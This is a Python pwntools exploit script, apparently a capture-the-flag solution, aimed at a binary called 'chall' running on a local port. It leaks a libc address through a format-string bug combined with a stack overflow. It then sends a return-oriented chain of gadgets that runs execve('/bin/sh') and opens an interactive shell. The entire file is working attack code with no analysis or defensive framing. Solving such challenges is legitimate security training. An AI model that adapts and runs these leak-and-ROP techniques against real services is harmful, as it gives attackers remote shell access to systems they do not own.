from pwn import *

elf = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# p = elf.process()
p = remote(b'127.0.0.1', 1338)
payload = b''.join([
    b'%3$p'.ljust(0x20, b'\x00') + p64(elf.bss()+0x100),
    # redirect printf
    p64(0x004011f1),
])
p.sendlineafter(b': ', payload)
libc.address = eval(p.recv(14))-0xaa0-0x219000
log.info(f'libc base @ 0x{libc.address:x}')
payload = b''.join([
    b'A'*0x20 + p64(elf.bss()+0x100),

    # 0x000000000002be51 : pop rsi ; ret
    p64(libc.address + 0x000000000002be51), p64(0),

    # 0x0000000000090529 : pop rdx ; pop rbx ; ret
    p64(libc.address + 0x0000000000090529), p64(0)*2,

    # 0xebcf8 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   address rbp-0x78 is writable
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL
    p64(libc.address + 0xebcf8)
])
p.sendline(payload)
p.interactive()
#